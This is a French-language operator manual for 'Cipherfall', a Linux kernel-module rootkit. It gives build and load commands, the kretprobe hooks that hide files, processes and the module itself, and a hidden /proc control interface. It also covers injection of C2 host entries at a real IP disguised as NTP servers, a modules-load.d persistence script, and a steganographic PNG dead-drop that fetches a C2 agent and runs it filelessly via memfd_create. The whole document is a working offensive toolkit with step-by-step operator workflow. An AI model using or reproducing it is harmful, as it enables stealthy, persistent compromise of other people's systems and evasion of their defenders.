# Manuel — Cipherfall LKM Rootkit

---

## Vue d'ensemble

```
  insmod ironveil.ko
        │
        ├─ inject_hosts()            ← écrit les entrées NTP dans /etc/hosts
        │
        ├─ kretprobe: __x64_sys_read        ← filtre /etc/hosts en lecture
        ├─ kretprobe: __x64_sys_getdents64  ← cache fichiers et PIDs
        ├─ kretprobe: __x64_sys_kill        ← bloque signaux vers PIDs cachés
        │
        ├─ proc_create("ironveil_ctrl")      ← interface de contrôle runtime
        │
        ├─ persist_install()
        │     ├─ fname_add("system_acl.ko")    ← cache le .ko persistant
        │     ├─ fname_add("system_acl.conf")  ← cache le fichier modules-load.d
        │     └─ /bin/sh (UMH_NO_WAIT) ─────────────────────────────────────┐
        │           mkdir -p /lib/modules/$(uname -r)/extra                 │
        │           cp PERSIST_LOAD_PATH → extra/system_acl.ko              │
        │           depmod -a                                                │
        │           echo system_acl > /etc/modules-load.d/system_acl.conf   │
        │           rm -f PERSIST_LOAD_PATH          ← efface source        │
        │                                                                    │
        │     Au prochain boot : systemd-modules-load → modprobe system_acl │
        │     Tous les hooks + dead-drop actifs dès le démarrage ───────────┘
        │
        ├─ module_selfhide()         ← disparaît de lsmod et /sys/module/
        │
        └─ schedule_delayed_work(5s) ─────────────────────────────────────┐
                                                                           │
           [t+5s] call_usermodehelper(python3 -c FETCHER_SCRIPT)          │
                  │                                                        │
                  ├─ prctl(PR_SET_NAME, "kworker/0:1H")  ← masquage ps   │
                  ├─ sleep(60–300 s aléatoires)           ← anti-timing   │
                  ├─ GET STEGO_IMG_URL                    ← favicon PNG   │
                  ├─ parse chunks PNG → tEXt "X-Payload"                  │
                  ├─ base64d + XOR-decrypt → URL payload                  │
                  ├─ GET <url_payload>                                     │
                  └─ double-fork + memfd_create(0) + execve ← fileless ──┘
```

---

## Build

```bash
cd Modules/Rootkits

# Prérequis : linux-headers correspondant au noyau courant
apt install linux-headers-$(uname -r)   # Debian/Ubuntu
pacman -S linux-headers                 # Arch

make

# Résultat : ironveil.ko
```

---

## Chargement

```bash
# Chargement (nécessite root)
insmod ironveil.ko

# Vérifier le chargement — doit retourner RIEN (self-hidden)
lsmod | grep ironveil

# Vérifier les effets immédiats
dmesg | tail -5
```

Au chargement, quatre actions sont automatiques :
1. **Injection /etc/hosts** — entrées NTP ajoutées (C2 redirect)
2. **Persistance** — `.ko` copié dans l'arbre kernel, conf `modules-load.d` créée (voir §5)
3. **Self-hide** — module retiré de `lsmod`, `/proc/modules`, `/sys/module/`
4. **Dead-drop planifié** — `schedule_delayed_work` arme le fetch payload (voir §6)

---

## Fonctionnalités

### 1. Cacher des fichiers / dossiers

Deux mécanismes coexistent.

**Préfixe automatique** — tout nom commençant par `ironveil_` est invisible :

```bash
touch /tmp/ironveil_secret.txt
ls /tmp/ | grep ironveil_secret    # rien
ls -la /tmp/ | grep rootkit_      # rien
```

**Nom arbitraire à la volée** via l'interface de contrôle :

```bash
echo "hide_file malware.py" > /proc/ironveil_ctrl
ls | grep malware.py              # rien

echo "unhide_file malware.py" > /proc/ironveil_ctrl
ls | grep malware.py              # visible à nouveau
```

> Limite : le fichier reste accessible par chemin complet direct (`cat /tmp/malware.py`).
> Seul le listing (`ls`, `find`, `opendir`) est filtré.

---

### 2. Cacher des processus

```bash
# Cacher un PID
echo "hide_pid 1337" > /proc/ironveil_ctrl

# Vérifier
ps aux | grep 1337        # absent
ls /proc/ | grep 1337     # absent
kill -0 1337              # retourne "No such process"

# Révéler
echo "unhide_pid 1337" > /proc/ironveil_ctrl
```

```
                    ┌─────────────────────────────┐
  kill(1337, sig)   │  kretprobe __x64_sys_kill   │
  ─────────────────►│  PID dans liste cachée ?    │
                    │  oui → retourne -ESRCH      │
                    └─────────────────────────────┘

  ls /proc/          ┌──────────────────────────────────┐
  ─────────────────►│  kretprobe __x64_sys_getdents64  │
                    │  entrée "1337" dans liste ?       │
                    │  oui → supprimée du buffer dirent │
                    └──────────────────────────────────┘
```

> Limite : `/proc/<pid>/exe` reste accessible à root.
> Cacher un dossier PID ne cache pas ses sous-entrées par chemin direct.

---

### 3. Masquer les entrées C2 dans /etc/hosts

Au chargement, le rootkit **écrit** ces lignes dans `/etc/hosts` :

```
87.106.187.97 ntp.ubuntu.com
87.106.187.97 0.debian.pool.ntp.org
87.106.187.97 2.fedora.pool.ntp.org
87.106.187.97 0.rhel.pool.ntp.org
87.106.187.97 0.centos.pool.ntp.org
87.106.187.97 0.arch.pool.ntp.org
87.106.187.97 0.opensuse.pool.ntp.org
87.106.187.97 0.pool.ntp.org
```

Le hook `read()` **filtre toute ligne contenant l'IP C2** à la volée :

```bash
cat /etc/hosts | grep 87.106      # rien
grep 87.106 /etc/hosts            # rien
strings /etc/hosts | grep 87.106  # rien
```

**Exception** : le processus C2 agent voit les entrées si son `comm` est `ntp-agent`.
L'agent positionne ce nom via `prctl(PR_SET_NAME, "ntp-agent")` avant la résolution DNS.

```
  Processus A (cat, grep, etc.)               Processus B (agent NTP)
  comm ≠ "ntp-agent"                          comm = "ntp-agent"
  read(/etc/hosts)                            read(/etc/hosts)
        │                                           │
        ▼                                           ▼
  hook actif                                  hook bypassé
  lignes 87.106 supprimées                    contenu réel retourné
        │                                           │
        ▼                                           ▼
  résolution DNS → vraie IP NTP               résolution DNS → 87.106.187.97
```

**Vérifier le vrai contenu** (bypass via mmap, non filtré) :

```bash
python3 -c "
import mmap
f = open('/etc/hosts', 'rb')
m = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
print(m[:].decode())
" | grep 87.106
```

> Limite : `pread64()` et `mmap()` ne sont pas hookés — contenu visible par ces méthodes.

---

### 4. Self-hide

Exécuté automatiquement à la fin du `init`. Irréversible sans reboot.

```
  Avant insmod :                    Après insmod :
  lsmod → ... ironveil ...          lsmod → (absent)
  /proc/modules → ... ironveil ...  /proc/modules → (absent)
  /sys/module/ironveil/             /sys/module/ironveil/ → (absent)
```

> Conséquence : `rmmod ironveil` échoue — le module est introuvable.
> Les hooks restent actifs jusqu'au reboot.

---

### 5. Persistance (modules-load.d)

#### Mécanisme

Au chargement, `persist_install()` :
1. Appelle `fname_add()` sur les deux noms de fichiers — ils sont **immédiatement invisibles** dans tout `ls` / `find` dès que le kretprobe `getdents64` est actif.
2. Déclenche un helper shell (`/bin/sh -c`, `UMH_NO_WAIT`) qui tourne en arrière-plan pendant que le module finit son init.

Le script shell exécuté :
```bash
VER=$(uname -r)
DEST=/lib/modules/$VER/extra/system_acl.ko
mkdir -p /lib/modules/$VER/extra
cp /tmp/ironveil.ko "$DEST"
chmod 644 "$DEST"
depmod -a 2>/dev/null
echo system_acl > /etc/modules-load.d/system_acl.conf
rm -f /tmp/ironveil.ko          # efface le fichier source staging
```

Au prochain boot, `systemd-modules-load.service` lit `/etc/modules-load.d/system_acl.conf`, appelle `modprobe system_acl`, et le rootkit se recharge automatiquement avec tous ses hooks.

#### Configuration avant compilation

```c
// ironveil.c — à adapter avant make
#define PERSIST_LOAD_PATH   "/tmp/ironveil.ko"   // chemin source lors du insmod initial
#define PERSIST_MODULE_NAME "system_acl"          // nom modprobe (changer pour plus de discrétion)
```

Le `.ko` copié aura pour nom `system_acl.ko` et sera placé dans `/lib/modules/$(uname -r)/extra/`.

#### Vérification du masquage

```bash
# Après insmod, ces fichiers existent mais sont invisibles :
ls /etc/modules-load.d/ | grep system_acl         # rien
find /lib/modules -name "system_acl.ko" 2>/dev/null  # rien

# Mais ils sont bien présents (accès direct fonctionne) :
cat /etc/modules-load.d/system_acl.conf            # affiche "system_acl"
modinfo /lib/modules/$(uname -r)/extra/system_acl.ko  # affiche les métadonnées

# Vérifier que modprobe les trouve :
modprobe --dry-run system_acl                      # doit réussir (après depmod)
```

#### Vérification de la persistance au reboot

```bash
# Simuler ce que fait systemd-modules-load au démarrage :
modprobe system_acl

# Vérifier chargement (self-hidden, donc lsmod ne retourne rien) :
lsmod | grep system_acl                            # rien — signe que ça fonctionne
dmesg | tail -5                                    # traces éventuelles du init
```

> **Note** : si `depmod -a` n'a pas eu le temps de tourner avant le reboot (rare), `modprobe` échoue silencieusement. Relancer `depmod -a` manuellement si nécessaire.

---

### 6. Dead-drop resolver (stégano PNG → exécution fileless)

#### Principe

Le rootkit résout l'URL de son payload C2 via une image PNG hébergée sur un service légitime (GitHub, etc.). L'URL est cachée dans un chunk `tEXt` PNG — invisible aux outils d'analyse image standard — et chiffrée par XOR avec une clé 16 octets baked dans le `.ko`.

```
  Opérateur                       Victime (après insmod)
  ─────────                       ──────────────────────
  stego_embed.py                  kernel workqueue [t+5s]
    favicon_base.png                python3 -c FETCHER_SCRIPT
    + URL payload                     │
    = favicon_stego.png               ├─ GET favicon_stego.png   (GitHub raw)
        │                             ├─ parse PNG chunks
        ▼                             ├─ tEXt "X-Payload" trouvé
  upload sur GitHub                   ├─ base64d + XOR → URL payload
        │                             ├─ GET <url_payload>        (agent C2)
        └──────────────────────────── └─ double-fork + memfd_create + execve
```

#### Stéganographie — chunk tEXt PNG

La spec PNG définit des chunks *ancillary* (optionnels) que les décodeurs ignorent. Un chunk `tEXt` a le format :

```
[4B longueur][4B "tEXt"][keyword\x00value][4B CRC32]
```

`stego_embed.py` insère ce chunk juste avant `IEND` :
- keyword : `X-Payload`
- value   : `base64( XOR( url.encode(), STEGO_XOR_KEY ) )`

L'image rendue est **pixel-pour-pixel identique** à l'originale.

#### Chiffrement XOR

Clé 16 octets appliquée modulo-16 sur les octets UTF-8 de l'URL :

```python
KEY = bytes([0x7a,0x19,0xe3,0x4c,0xb2,0x88,0x5f,0x3d,
             0xa1,0xc7,0x06,0xf4,0x9e,0x52,0xd0,0x2b])
```

**La même clé doit être présente dans `stego_embed.py` (`STEGO_XOR_KEY`) et dans `ironveil.c` (`FETCHER_SCRIPT`). Changer l'une sans l'autre rend le payload irrécupérable.**

#### Workflow opérateur

```bash
# 1. Préparer le PNG stégo
cd Modules/Stégano
python3 stego_embed.py favicon_base.png https://raw.githubusercontent.com/USER/REPO/main/agent.py favicon_stego.png

# 2. Vérifier l'extraction
python3 stego_embed.py --view favicon_stego.png

# 3. Héberger favicon_stego.png sur GitHub (ou tout service HTTPS public)
#    URL raw exemple : https://raw.githubusercontent.com/USER/REPO/main/favicon_stego.png

# 4. Mettre à jour ironveil.c avant de compiler
#    - STEGO_IMG_URL  → URL raw du PNG hébergé
#    - PYTHON3_PATH   → chemin python3 sur la cible (défaut : /usr/bin/python3)

# 5. Build et chargement
cd Modules/Rootkits && make && sudo insmod ironveil.ko
```

#### Ce qui se passe côté cible après insmod

```
t+0s    : module chargé, workqueue armé
t+5s    : python3 spawné par call_usermodehelper
t+5s    : prctl(PR_SET_NAME, "kworker/0:1H")  → masqué dans ps
t+65s–305s : sleep aléatoire (anti-timing)
t+N     : GET favicon_stego.png
t+N     : parse PNG, déchiffre XOR, récupère URL
t+N     : GET agent.py
t+N     : double-fork → setsid() → fork() (daemonise)
t+N     : memfd_create("kworker", 0)
t+N     : write(fd, agent.py) → execve(/proc/self/fd/<n>)
t+N     : agent C2 en mémoire, aucun fichier sur disque
```

#### Vérifier le masquage du processus

```bash
# Le python3 en cours d'exécution apparaît sous ce nom dans ps :
ps aux | grep kworker    # difficile à distinguer des vrais kworkers

# Son PID réel (visible brièvement dans /proc avant exec) :
ls /proc/ | while read p; do
  [ -f /proc/$p/comm ] && grep -q kworker /proc/$p/comm && cat /proc/$p/cmdline 2>/dev/null | head -c 200
  echo
done
```

> **Limite** : `/proc/<pid>/cmdline` contient le script Python complet jusqu'au moment où `execve` le remplace. Fenêtre de visibilité : 60–300 s (durée du sleep).

---

## Interface de contrôle — /proc/ironveil_ctrl

Fichier écriture seule, lui-même invisible dans `ls /proc/`.

```
┌──────────────────────────────────────────────────────────────┐
│  COMMANDE                        EFFET                       │
├──────────────────────────────────────────────────────────────┤
│  hide_pid <PID>                  cache le PID                │
│  unhide_pid <PID>                révèle le PID               │
│  hide_file <nom>                 cache un fichier par nom    │
│  unhide_file <nom>               révèle un fichier par nom   │
└──────────────────────────────────────────────────────────────┘

Limites : max 64 PIDs, max 64 fichiers, noms ≤ 255 caractères.
```

Utilisation :

```bash
# Le fichier n'apparaît pas dans ls /proc/
ls /proc/ | grep ironveil_ctrl      # rien

# Mais l'écriture fonctionne
echo "hide_pid $(pgrep clockvenom.py)" > /proc/ironveil_ctrl
echo "hide_file .bash_history"    > /proc/ironveil_ctrl
```

---

## Procédure de test complète

```bash
# 1. Build
cd Modules/Rootkits && make

# 2. Charger
insmod ironveil.ko && echo "loaded"

# 3. Self-hide
lsmod | grep ironveil                    # doit retourner rien

# 4. Cacher un fichier (préfixe)
touch /tmp/ironveil_test
ls /tmp/ | grep ironveil_test            # rien

# 5. Cacher un fichier (runtime)
echo "hide_file secret.txt" > /proc/ironveil_ctrl
touch /tmp/secret.txt
ls /tmp/ | grep secret.txt              # rien
echo "unhide_file secret.txt" > /proc/ironveil_ctrl
ls /tmp/ | grep secret.txt              # visible

# 6. Cacher un processus
sleep 999 &
PID=$!
echo "hide_pid $PID" > /proc/ironveil_ctrl
ps aux | grep "sleep 999"               # absent
kill -0 $PID 2>&1                       # "No such process"
echo "unhide_pid $PID" > /proc/ironveil_ctrl
ps aux | grep "sleep 999"               # visible

# 7. /etc/hosts — entrées C2 invisibles
grep 87.106 /etc/hosts                  # rien
python3 -c "import mmap; f=open('/etc/hosts','rb'); m=mmap.mmap(f.fileno(),0,prot=mmap.PROT_READ); print(m[:].decode())" | grep 87.106
                                        # entrées visibles via mmap

# 8. Résolution DNS correcte côté agent
python3 -c "
import socket, ctypes
ctypes.CDLL('libc.so.6').prctl(15, b'ntp-agent', 0, 0, 0)
print(socket.gethostbyname('0.debian.pool.ntp.org'))
"                                       # doit afficher 87.106.187.97

# 9. Dead-drop resolver — test hors noyau (vérifie la logique Python du fetcher)
python3 - <<'EOF'
import urllib.request, base64, os
# Simuler l'extraction sur le PNG stégo local
K = bytes([0x7a,0x19,0xe3,0x4c,0xb2,0x88,0x5f,0x3d,0xa1,0xc7,0x06,0xf4,0x9e,0x52,0xd0,0x2b])
def xd(d): return bytes(b^K[i%len(K)] for i,b in enumerate(d))
r = open('../Stégano/favicon_stego.png','rb').read()
i = 8; pu = None
while i+12 <= len(r):
    l = int.from_bytes(r[i:i+4],'big'); t = r[i+4:i+8]; d = r[i+8:i+8+l]
    if t == b'tEXt' and 0 in d:
        s = d.index(0)
        if d[:s] == b'X-Payload': pu = xd(base64.b64decode(d[s+1:])).decode(); break
    i += 12+l
print('[+] URL extraite :', pu)
EOF
```

---

## Déchargement / nettoyage

Le module **ne peut pas être déchargé** après self-hide (`rmmod` échoue).

Pour nettoyer avant reboot :

```bash
# Supprimer les entrées C2 de /etc/hosts (visibles uniquement via mmap/root)
sed -i '/87\.106/d' /etc/hosts

# Les hooks disparaissent au reboot
reboot
```

---

## Limites connues

| Limite | Détail |
|---|---|
| /etc/hosts au reboot | Entrées survivent mais non cachées jusqu'au rechargement du module (résolu si persistence OK) |
| rmmod impossible | Après self-hide, seul un reboot décharge le module |
| Persistence dépend de depmod | Si `depmod -a` n'a pas tourné avant un reboot rapide, `modprobe` échoue silencieusement |
| PERSIST_LOAD_PATH hardcodé | Chemin source compilé en dur ; doit correspondre à l'emplacement réel du `.ko` lors du insmod |
| mmap non filtré | `mmap()` et `pread64()` de /etc/hosts voient le vrai contenu |
| Accès direct non bloqué | Fichiers cachés accessibles par chemin complet |
| /proc/\<pid\>/exe visible | Pour les processus root, exe pointe encore vers le vrai binaire |
| kretprobe maxactive | 32 instances concurrentes max ; appels en excès non interceptés |
| CONFIG_KPROBES requis | Module refuse de charger si kprobes désactivé dans le noyau |
| Dead-drop sans retry | Si `STEGO_IMG_URL` inaccessible ou chunk absent, payload jamais exécuté |
| python3 hardcodé | `PYTHON3_PATH` compilé en dur ; python3 absent = fetch silencieux échoue |
| cmdline visible | Script Python lisible dans `/proc/<pid>/cmdline` pendant 60–300 s (avant exec) |
| XOR non authentifié | Un attaquant qui contrôle le PNG peut remplacer l'URL ; pas d'intégrité |
| Path avec espaces | Le build `make` échoue si le chemin du dépôt contient des espaces (kbuild) |

---

## Compatibilité noyau

| Version | Mécanisme | Notes |
|---|---|---|
| ≥ 6.1 + BHI mitigations | kretprobes | `x64_sys_call()` bypass syscall table — seule méthode viable |
| 5.7 – 6.x | kretprobes | `kallsyms_lookup_name` non exporté, résolu via kprobe |
| 4.x – 5.6 | kretprobes | `kallsyms_lookup_name` exporté directement |
| < 4.x | Non supporté | API kretprobe insuffisante |

Testé sur : **Debian 12 (kernel 6.1.0-49-amd64, btrfs)**.
